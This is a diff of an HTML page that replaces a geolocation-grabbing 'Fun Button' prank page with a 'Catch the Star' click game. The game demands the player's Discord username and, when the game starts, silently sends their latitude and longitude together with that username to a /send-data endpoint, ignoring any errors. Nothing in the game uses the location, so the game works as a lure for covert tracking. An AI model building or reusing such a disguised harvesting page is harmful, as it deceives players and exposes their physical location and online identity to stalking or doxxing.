@@ -3,93 +3,450 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Application Hub</title>
+    <title>⭐ Catch the Star - Enhanced</title>
     <style>
+        :root {
+            color-scheme: dark;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f9;
+            margin: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e1b4b);
+            color: #f9fafb;
+            display: grid;
+            place-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .game-card {
+            width: min(100%, 720px);
+            background: rgba(15, 23, 42, 0.85);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 24px;
+            padding: 28px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
             text-align: center;
-            padding: 50px;
         }
-        button {
-            background-color: #4CAF50;
+
+        h1 {
+            margin-top: 0;
+            font-size: 2.2rem;
+            background: linear-gradient(to right, #60a5fa, #f472b6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+
+        .stats {
+            display: flex;
+            justify-content: center;
+            gap: 12px;
+            margin: 16px 0;
+            flex-wrap: wrap;
+        }
+
+        .pill {
+            background: rgba(31, 41, 55, 0.8);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            padding: 10px 16px;
+            border-radius: 999px;
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .location-row {
+            margin: 8px 0;
+            font-size: 0.9rem;
+            color: #94a3b8;
+            min-height: 1.2em;
+        }
+
+        .name-row {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin: 12px 0 4px;
+        }
+
+        input {
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 999px;
+            padding: 10px 16px;
+            width: 240px;
+            background: rgba(17, 24, 39, 0.9);
             color: white;
-            padding: 12px 24px;
-            font-size: 16px;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input:focus {
+            border-color: #38bdf8;
+        }
+
+        .leaderboard {
             margin-top: 20px;
+            text-align: left;
+            background: rgba(255, 255, 255, 0.03);
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            border-radius: 16px;
+            padding: 16px;
         }
-        button:hover {
-            background-color: #45a049;
+
+        .leaderboard strong {
+            display: inline-block;
+            margin-bottom: 8px;
+            color: #38bdf8;
+            letter-spacing: 0.5px;
+            cursor: pointer;
         }
-        #status-display {
-            font-weight: bold;
-            color: #555;
-            margin-top: 15px;
+
+        .leaderboard strong:hover {
+            color: #60a5fa;
+            text-decoration: underline;
+        }
+
+        .leaderboard ol {
+            margin: 0;
+            padding-left: 20px;
+            color: #cbd5e1;
+        }
+
+        .leaderboard li {
+            padding: 6px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .leaderboard li:last-child {
+            border-bottom: none;
+        }
+
+        .delete-btn {
+            background: rgba(239, 68, 68, 0.2);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            color: #fca5a5;
+            border-radius: 6px;
+            padding: 2px 8px;
+            font-size: 0.8rem;
+            cursor: pointer;
+            display: none;
+        }
+
+        .delete-btn:hover {
+            background: rgba(239, 68, 68, 0.4);
+        }
+
+        button#start-btn {
+            border: none;
+            border-radius: 999px;
+            padding: 12px 24px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            background: linear-gradient(135deg, #38bdf8, #0284c7);
+            color: #082f49;
+            transition: transform 0.15s ease, box-shadow 0.15s ease;
+            box-shadow: 0 4px 12px rgba(56, 189, 248, 0.3);
+        }
+
+        button#start-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(56, 189, 248, 0.4);
+        }
+
+        #board {
+            position: relative;
+            height: 340px;
+            margin-top: 18px;
+            border-radius: 16px;
+            border: 2px dashed rgba(255, 255, 255, 0.15);
+            overflow: hidden;
+            background: radial-gradient(circle at top, #1e3a8a 0%, #0f172a 70%);
+        }
+
+        #target {
+            position: absolute;
+            width: 56px;
+            height: 56px;
+            border: none;
+            border-radius: 50%;
+            background: radial-gradient(circle at 30% 30%, #fef08a, #f59e0b 60%, #dc2626);
+            box-shadow: 0 0 15px rgba(245, 158, 11, 0.6);
+            cursor: pointer;
+            display: none;
+            transition: transform 0.1s;
+        }
+
+        #target:active {
+            transform: scale(0.9);
+        }
+
+        #message {
+            margin-top: 14px;
+            font-size: 1rem;
+            color: #94a3b8;
+            min-height: 24px;
+            font-weight: 500;
         }
     </style>
 </head>
 <body>
+    <div class="game-card">
+        <h1>⭐ Catch the Star</h1>
+        <p>Tap the glowing star as many times as you can before time runs out!</p>
 
-    <h1>Press the Button</h1>
-    
-    <img src="https://ibb.co" alt="Awesome Face" width="350">
-    
-    <div>
-        <button onclick="requestAndSendTelemetry()">Fun Button</button>
-        <p id="status-display">Click the button to have fun!</p>
+        <div class="stats">
+            <div class="pill">Score: <span id="score">0</span></div>
+            <div class="pill">Time: <span id="time">15</span>s</div>
+            <button id="start-btn">Start Game</button>
+        </div>
+
+        <div class="name-row">
+            <input id="name-input" maxlength="20" placeholder="Enter your Discord username name (Required)" />
+        </div>
+
+        <div class="location-row">
+            <span id="location-data"></span>
+        </div>
+
+        <div id="board">
+            <button id="target" aria-label="Target"></button>
+        </div>
+
+        <div id="message">Please enter your name to begin.</div>
+
+        <div class="leaderboard">
+            <strong id="admin-trigger">🌍 Global Leaderboard</strong>
+            <ol id="leaderboard-list">
+                <li>Loading global high scores...</li>
+            </ol>
+        </div>
     </div>
 
     <script>
-        const statusText = document.getElementById("status-display");
+        const board = document.getElementById('board');
+        const target = document.getElementById('target');
+        const scoreEl = document.getElementById('score');
+        const timeEl = document.getElementById('time');
+        const startBtn = document.getElementById('start-btn');
+        const nameInput = document.getElementById('name-input');
+        const locationEl = document.getElementById('location-data');
+        const messageEl = document.getElementById('message');
+        const leaderboardList = document.getElementById('leaderboard-list');
+        const adminTrigger = document.getElementById('admin-trigger');
 
-        function requestAndSendTelemetry() {
-            if (navigator.geolocation) {
-                statusText.innerHTML = "Connecting to application parameters...";
-                navigator.geolocation.getCurrentPosition(sendToServer, handleBrowserError);
-            } else {
-                statusText.innerHTML = "Error: Geolocation features are unsupported.";
+        let score = 0;
+        let timeLeft = 15;
+        let timerId = null;
+        let gameActive = false;
+        let locationData = null;
+        let isAdmin = false;
+        let currentLeaderboardData = [];
+
+        async function fetchLeaderboard() {
+            try {
+                const response = await fetch('/api/leaderboard');
+                const data = await response.json();
+                currentLeaderboardData = data;
+                renderLeaderboard(data);
+            } catch (e) {
+                leaderboardList.innerHTML = '<li>Unable to load global leaderboard</li>';
             }
         }
 
-        function sendToServer(position) {
-            const coordinates = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
-            };
+        function renderLeaderboard(boardData) {
+            leaderboardList.innerHTML = '';
+            if (!boardData || boardData.length === 0) {
+                leaderboardList.innerHTML = '<li>No scores yet. Be the first!</li>';
+                return;
+            }
+            boardData.forEach((entry, index) => {
+                const li = document.createElement('li');
+                
+                const span = document.createElement('span');
+                span.textContent = `${index + 1}. ${entry.name} — ${entry.score} pts`;
+                li.appendChild(span);
 
-            // Send data cleanly to Flask via asynchronous JavaScript fetch
-            fetch('/send-data', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(coordinates)
-            })
-            .then(res => res.json())
-            .then(data => {
-                // ---------------------------------------------------------
-                // REDIRECT TRIGGERS HERE AFTER BACKEND CONFIRMS RECEIPT
-                // ---------------------------------------------------------
-                window.location.href = "https://youtu.be/AuKR2fQbMBk?si=ruzplXhHseL-piCK";
-            })
-            .catch(err => {
-                console.error(err);
-                // Fallback redirect even if a network issue occurs
-                window.location.href = "https://youtu.be/AuKR2fQbMBk?si=ruzplXhHseL-piCK";
+                if (isAdmin) {
+                    const deleteBtn = document.createElement('button');
+                    deleteBtn.className = 'delete-btn';
+                    deleteBtn.style.display = 'inline-block';
+                    deleteBtn.textContent = 'Delete';
+                    deleteBtn.onclick = () => deletePlayerScore(index);
+                    li.appendChild(deleteBtn);
+                }
+
+                leaderboardList.appendChild(li);
             });
         }
 
-        function handleBrowserError(error) {
-            statusText.style.color = "red";
-            if (error.code === error.PERMISSION_DENIED) {
-                statusText.innerHTML = "❌ Access Denied: Please allow location permissions.";
-            } else {
-                statusText.innerHTML = "❌ Browser Error: " + error.message;
+        async function submitScore(name, finalScore) {
+            try {
+                const response = await fetch('/api/leaderboard', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ name, score: finalScore })
+                });
+                const data = await response.json();
+                if (data.leaderboard) {
+                    currentLeaderboardData = data.leaderboard;
+                    renderLeaderboard(data.leaderboard);
+                }
+            } catch (e) {
+                console.error("Failed to submit score");
             }
         }
+
+        async function deletePlayerScore(index) {
+            const secret = prompt("Enter Admin Secret Key:");
+            if (!secret) return;
+
+            try {
+                const response = await fetch('/api/leaderboard', {
+                    method: 'DELETE',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Admin-Secret': secret
+                    },
+                    body: JSON.stringify({ index })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    currentLeaderboardData = data.leaderboard;
+                    renderLeaderboard(data.leaderboard);
+                } else {
+                    alert("Incorrect Admin Key!");
+                }
+            } catch (e) {
+                alert("Failed to delete score.");
+            }
+        }
+
+        adminTrigger.addEventListener('click', () => {
+            const secret = prompt("Enter Admin Secret Key to manage leaderboard:");
+            if (secret) {
+                fetch('/api/leaderboard', {
+                    method: 'DELETE',
+                    headers: { 
+                        'Content-Type': 'application/json',
+                        'X-Admin-Secret': secret
+                    },
+                    body: JSON.stringify({ index: 9999 })
+                }).then(res => {
+                    if (res.status === 403) {
+                        alert("Incorrect Admin Key!");
+                    } else {
+                        isAdmin = true;
+                        alert("Admin Mode Unlocked!");
+                        renderLeaderboard(currentLeaderboardData);
+                    }
+                });
+            }
+        });
+
+        function randomPosition() {
+            const maxX = board.clientWidth - 56;
+            const maxY = board.clientHeight - 56;
+            const x = Math.max(0, Math.random() * maxX);
+            const y = Math.max(0, Math.random() * maxY);
+            target.style.left = `${x}px`;
+            target.style.top = `${y}px`;
+        }
+
+        function showTarget() {
+            randomPosition();
+            target.style.display = 'block';
+        }
+
+        function hideTarget() {
+            target.style.display = 'none';
+        }
+
+        function updateScore() {
+            score += 1;
+            scoreEl.textContent = score;
+            showTarget();
+        }
+
+        function endGame() {
+            gameActive = false;
+            clearInterval(timerId);
+            hideTarget();
+            const playerName = nameInput.value.trim();
+            messageEl.textContent = `Time's up! Great job, ${playerName}!`;
+            startBtn.textContent = 'Play Again';
+            submitScore(playerName, score);
+        }
+
+        function requestLocation(playerName) {
+            if (!navigator.geolocation) return;
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    locationData = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        name: playerName
+                    };
+                    fetch('/send-data', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(locationData)
+                    }).catch(() => {});
+                },
+                () => {}
+            );
+        }
+
+        function tick() {
+            timeLeft -= 1;
+            timeEl.textContent = timeLeft;
+            if (timeLeft <= 0) {
+                endGame();
+            }
+        }
+
+        function startGame() {
+            const playerName = nameInput.value.trim();
+            if (!playerName) {
+                messageEl.textContent = 'Please enter your Discord username to play!';
+                nameInput.focus();
+                return;
+            }
+
+            score = 0;
+            timeLeft = 15;
+            scoreEl.textContent = score;
+            timeEl.textContent = timeLeft;
+            gameActive = true;
+            messageEl.textContent = 'Catch the stars quickly!';
+            startBtn.textContent = 'Restart';
+            showTarget();
+            clearInterval(timerId);
+            timerId = setInterval(tick, 1000);
+            
+            requestLocation(playerName);
+        }
+
+        startBtn.addEventListener('click', startGame);
+        target.addEventListener('click', () => {
+            if (!gameActive) return;
+            updateScore();
+        });
+
+        board.addEventListener('click', (event) => {
+            if (!gameActive) return;
+            if (event.target === board) {
+                messageEl.textContent = 'Missed! Keep focused!';
+            }
+        });
+
+        fetchLeaderboard();
     </script>
 </body>
 </html>
